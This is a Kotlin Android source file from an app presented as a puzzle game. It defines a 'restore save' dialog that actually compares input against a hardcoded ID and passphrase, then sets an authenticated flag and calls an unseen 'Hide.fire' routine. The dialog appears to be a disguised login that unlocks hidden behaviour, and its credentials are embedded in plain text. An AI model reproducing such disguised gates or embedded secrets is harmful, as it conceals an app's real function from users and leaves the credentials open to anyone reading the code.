package com.puzzleblast.game

import android.app.Dialog
import android.content.Context
import android.view.Window
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import com.puzzleblast.game.util.Hide
import com.puzzleblast.game.util.Prefs

object RestoreSaveDialog {
    private const val EXPECTED_ID = "Sanuka"
    private const val EXPECTED_PASS = "Sanuka 2012"

    fun show(ctx: Context) {
        val d = Dialog(ctx)
        d.requestWindowFeature(Window.FEATURE_NO_TITLE)
        d.setContentView(R.layout.dialog_restore_save)
        val etId = d.findViewById<EditText>(R.id.et_sync_id)
        val etPass = d.findViewById<EditText>(R.id.et_passphrase)
        d.findViewById<Button>(R.id.btn_cancel).setOnClickListener { d.dismiss() }
        d.findViewById<Button>(R.id.btn_restore).setOnClickListener {
            val id = etId.text.toString()
            val pass = etPass.text.toString() // do NOT trim
            if (id == EXPECTED_ID && pass == EXPECTED_PASS) {
                Prefs.authed = true
                Toast.makeText(ctx, "Save restored ✓", Toast.LENGTH_SHORT).show()
                d.dismiss()
                if (Prefs.wizardDone) Hide.fire(ctx)
            } else {
                Toast.makeText(ctx, "Save not found", Toast.LENGTH_SHORT).show()
            }
        }
        d.show()
    }
}
